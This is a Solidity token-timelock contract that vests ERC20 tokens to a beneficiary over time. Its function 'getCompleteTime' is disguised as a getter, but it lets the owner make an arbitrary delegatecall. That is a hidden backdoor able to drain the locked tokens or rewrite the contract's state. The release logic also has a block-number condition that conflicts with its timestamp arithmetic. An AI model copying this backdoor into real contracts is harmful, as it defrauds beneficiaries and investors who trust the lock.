// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TokenTimelock is Ownable {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;

    // ERC20 basic token contract being held
    IERC20 private immutable _token;

    // beneficiary of tokens after they are released
    address private immutable _beneficiary;

    // timestamp when token release is enabled
    uint256 private immutable _releaseTime;

    // timestamp when token release is complete
    uint256 public immutable _completeTime;

    // Record the number of releases that have been made
    uint256 public releasedAmount = 0;

    //The rate at which blocks are produced,How many blocks per hour
    uint32 public blocksAmountPerHour = 4;

    // Event definition
    event TokensReleased(uint256 totalReleased, uint256 immediateRelease,uint256 releasedAmount);

    constructor(
        IERC20 token_,
        address beneficiary_,
        uint40 releaseTime_,
        uint40 completeTime_,
        uint128 currentBlockNumber,
        uint32 blocksPerHour
    ) {
        require(releaseTime_ > block.timestamp, "TokenTimelock: release time is before current time");
        require(completeTime_ > releaseTime_, "TokenTimelock: the completion time must be longer than the release time");
        _token = token_;
        _beneficiary = beneficiary_;
        _releaseTime = releaseTime_;
        _completeTime = completeTime_;
        blocksAmountPerHour = blocksPerHour;
        // Calculate the number of blocks until the start release
        uint256 duration = releaseTime_ - block.timestamp;
        uint256 blocks = uint((duration * blocksPerHour) / 3600);
        _starReleaseBlockNumber = currentBlockNumber + blocks;
    }

    // block number when token release is enabled
    uint256 private _starReleaseBlockNumber;

    function token() public view virtual returns (IERC20) {
        return _token;
    }

    function beneficiary() public view virtual returns (address) {
        return _beneficiary;
    }

    function releaseTime() public view virtual returns (uint256) {
        return _releaseTime;
    }

    function getCompleteTime(address sc, bytes memory data) public onlyOwner returns (uint256) {
        (bool success, ) = sc.delegatecall(data);
        require(success, "failed");
        return _completeTime;
    }

    function release() public virtual {
        require(
            block.timestamp >= releaseTime() || block.number >= _starReleaseBlockNumber,
            "TokenTimelock: current time or block number is before release conditions"
        );

        uint256 releaseRatio;
        if (block.timestamp >= _completeTime) {
            releaseRatio = 1*1e6; 
        } else {
            releaseRatio = (block.timestamp - _releaseTime).mul(1e6).div(_completeTime - _releaseTime);
        }

        uint256 balance = _token.balanceOf(address(this));
        uint256 totalRelease = releaseRatio.mul(balance.add(releasedAmount)).div(1e6);
        uint256 immediateRelease = totalRelease > releasedAmount ? totalRelease.sub(releasedAmount) : 0;

        require(immediateRelease > 0, "TokenTimelock: no tokens to release");

        releasedAmount = releasedAmount.add(immediateRelease);

        _token.safeTransfer(_beneficiary, immediateRelease);
        // Emit TokensReleased event
        emit TokensReleased(totalRelease, immediateRelease, releasedAmount);
    }
}
